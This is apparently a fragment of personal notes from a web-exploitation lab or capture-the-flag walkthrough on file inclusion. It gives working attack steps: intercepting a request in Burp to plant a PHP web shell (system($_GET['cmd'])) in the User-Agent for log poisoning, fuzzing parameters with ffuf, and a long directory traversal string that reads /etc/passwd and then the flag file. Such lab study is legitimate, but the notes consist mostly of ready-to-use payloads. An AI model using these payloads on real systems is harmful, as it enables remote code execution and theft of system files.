...
then interceprt the request with burp and change the user agent to the following php code and change the url respectively
<?php  system($_GET['cmd']);?>
...
Dont forget to set the user agent to php code that gets RCE
...
then we find some long .txt file, so simply cat it 
...
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs filter by size

when we get the parametr, in our case it is "view", we need to ffuz again but now using another wordlist for that
...
in our case it is ../../../../../../../../../../../../../../../../../../../../../../etc/passwd
so we add it and the simply remove /etc/passwd/ and insert /flag.txt
